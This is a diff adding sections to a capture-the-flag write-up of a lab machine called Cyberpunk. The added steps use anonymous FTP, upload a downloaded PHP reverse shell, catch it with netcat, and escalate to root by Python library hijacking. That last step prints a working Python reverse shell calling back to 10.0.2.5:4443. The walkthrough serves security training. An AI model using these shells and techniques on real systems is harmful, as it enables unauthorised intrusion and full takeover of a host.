@@ -2,7 +2,7 @@
 title: "Cyberpunk"
 date: 2025-01-14 00:00:00 +0900
 categories: [The Hacker Labs] 
-tags: [Linux, Easy]
+tags: [Linux, Easy, NMAP, HTTP, FTP, NETCAT, PYTHON]
 ---
 
 # The Hacker Labs Cyberpunk WriteUp
@@ -203,3 +203,119 @@ The command gobuster dir is used with Gobuster, a tool for directory and file br
 ```bash
 gobuster -u http://192.168.1.134/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php, txt, html, bak, py
 ```
+
+## Anonymous FTP Access
+
+We connected to the FTP service using anonymous access.
+
+```bash
+❯ ftp anonymous@192.168.1.134
+Password: 
+ftp> ls
+```
+Available files:
+
+```bash
+-rw-r--r--   1 0        0             713 May  1 14:55 index.html
+-rw-r--r--   1 0        0             923 May  1 08:51 secret.txt
+```
+
+Downloaded and analyzed the secret.txt file:
+
+```bash
+❯ cat secret.txt
+```
+
+Content inside of secret.txt:
+
+```bash
+*********************************************
+*                                           *
+*        Hello Netrunner,                   *
+*                                           *
+*   You have been hired by the best fixer   *
+*   in the city to carry out a crucial      *
+*   mission.                                *
+*                                           *
+*   We have information that Arasaka,       *
+*   the most powerful mega-corporation in   *
+*   Night City, is migrating its systems    *
+*   and is currently vulnerable.            *
+*                                           *
+*   We need you to infiltrate their systems *
+*   and disable the Relic to save V's life. *
+*                                           *
+*   I'll be waiting for you in Apache.      *
+*                                           *
+*                         - Alt             *
+*********************************************
+```
+
+## Uploading Reverse Shell
+
+Downloading a PHP reverse shell from the PentestMonkey repository.
+
+```bash
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+Uploading the PHP file to the server via FTP.
+
+```bash
+ftp> put php-reverse-shell.php
+```
+
+## Executing Reverse Shell
+
+Accssing the HTTP port to execute the 'php-reverse-shell.php' file. Connected to our machine using Netcat:
+
+```bash
+❯ nc -lnvp 443
+```
+
+Ran the whoami command:
+
+```bash
+# whoami
+www-data
+```
+
+## Privilege Escalation
+
+Exploring the system I found an interesting file in /opt/arasaka.txt, which contains a Brainfuck encoded string.
+
+```css
+++++++++++[>++++++++++>++++++++++++>++++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++++>+++++++++++>+++++++++++>+++++>+++++>++++++<<<<<<<<<<<<-]>-.>+.>--.>+.>++++.>++.>---.>.>---.>.>--.>-----..
+```
+Decrypted the string and found useful information. We authenticated as the arasaka user and discovered we could execute a Python script with root privileges.
+
+```bash
+sudo -u root /usr/bin/python3.11 /home/arasaka/randombase64.py
+Exploiting the Vulnerability
+```
+
+Using Python Library Hijacking to gain root access by modifying the script.
+
+```python
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.2.5", 4443))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])
+```
+
+Connecting again through Netcat, this time as root.
+
+```bash
+# whoami
+root
+```
+
+## Conclusion
+
+At the end of the challenge, we successfully infiltrated Arasaka's systems, disabled the Relic, and gained root access. This writeup demonstrates the importance of proper permission configuration and protection of exposed services.
